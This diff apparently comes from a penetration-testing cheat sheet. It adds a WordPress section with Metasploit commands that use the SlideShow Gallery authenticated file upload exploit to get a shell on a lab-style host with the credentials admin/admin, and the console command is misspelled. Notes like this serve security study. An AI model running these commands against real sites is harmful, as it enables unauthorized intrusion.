@@ -170,6 +170,26 @@ $ whoami
 
 Open the page containing the shell and start writing in the msfconsole linux commands: `whoami`.
 
+## Wordpress
+
+### Plugin SlideShow < 1.4.7
+
+Exploit WordPress using SlideShow Gallery Authenticated File Upload
+
+```bash
+
+mfsconsole
+
+use exploit/unix/webapp/wp_slideshowgallery_upload
+set RHOST 192.168.1.74
+set TARGETURI /weblog/
+set WP_USER admin
+set WP_PASSWORD admin
+run
+
+shell
+```
+
 
 ## WalkThroughs
 
